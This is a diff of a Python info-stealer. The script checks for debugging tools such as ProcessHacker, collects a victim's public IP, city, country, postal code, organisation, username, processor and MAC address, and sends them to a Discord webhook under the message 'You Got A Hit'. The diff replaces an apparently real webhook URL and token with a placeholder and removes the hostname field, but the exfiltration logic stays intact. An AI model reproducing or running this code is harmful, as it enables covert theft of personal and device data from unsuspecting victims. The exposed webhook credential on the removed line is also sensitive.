@@ -4,7 +4,7 @@ import cv2
 import re, uuid
 from PIL import ImageGrab
 from browser_history.browsers import Chrome
-webhook = "https://discordapp.com/api/webhooks/1074068098342207659/lHWuqw_aVOWzEoH3tzqt2wTxXrS5wDZj9dHRAYdPyMHtAHeS3r1NHm6rE2Goht8cg-wj"
+webhook = "Webhooksss"
 process = [
     "ProcessHacker.exe",
     "httpdebuggerui.exe",
@@ -59,8 +59,7 @@ if diskSizeGB < minDiskSizeGB:
 
 
 
-machines = platform.uname()
-hostnames = socket.gethostname()  
+machines = platform.uname() 
 ips = requests.get('https://api.ipify.org').text
 info = requests.get("http://ipinfo.io/json").json()
 city = info['city']
@@ -80,7 +79,7 @@ embed = {
 
                         "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                     },
-                    "description": f" @everyone You Got A Hit ```There Public Ip Is: {ips}``` ```There City Is: {city}``` ```There Country Is: {country}``` ```There Region Is: {region}``` ```There Lang is: {lang}```  ```There Postal Code Is: {post}``` ```There Organzation Is: {org}```  ```There Pc Username Is: {pc_username}``` ```There Pc Host Name Is: {hostnames}``` ```There Pc Machine Name Is: {machines.machine}``` ```There Pc Processer Is: {machines.processor}``` ```There Pc Mac Address Is : {':'.join(re.findall('..', '%012x' % uuid.getnode()))}```",
+                    "description": f" @everyone You Got A Hit ```There Public Ip Is: {ips}``` ```There City Is: {city}``` ```There Country Is: {country}``` ```There Region Is: {region}``` ```There Lang is: {lang}```  ```There Postal Code Is: {post}``` ```There Organzation Is: {org}```  ```There Pc Username Is: {pc_username}``` ```There Pc Machine Name Is: {machines.machine}``` ```There Pc Processer Is: {machines.processor}``` ```There Pc Mac Address Is : {':'.join(re.findall('..', '%012x' % uuid.getnode()))}```",
                 }
             ]
         }
